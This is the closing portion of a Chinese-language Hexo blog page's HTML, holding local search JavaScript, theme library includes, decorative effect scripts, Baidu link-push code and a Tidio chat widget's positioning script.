                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/"><\/script>');
            }
        </script>
    

    <!-- 鼠标星星特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/"><\/script>');
            }
        </script>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    
        <script src="//code.tidio.co/8rh2fkswsxbq8ekykk2ieakrakfltfah.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

    <!--腾讯兔小巢-->
    
    

    
    
    <script type="text/javascript" size="150" alpha='0.6'
        zIndex="-1" src="/libs/background/ribbon.min.js" async="async"></script>
    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
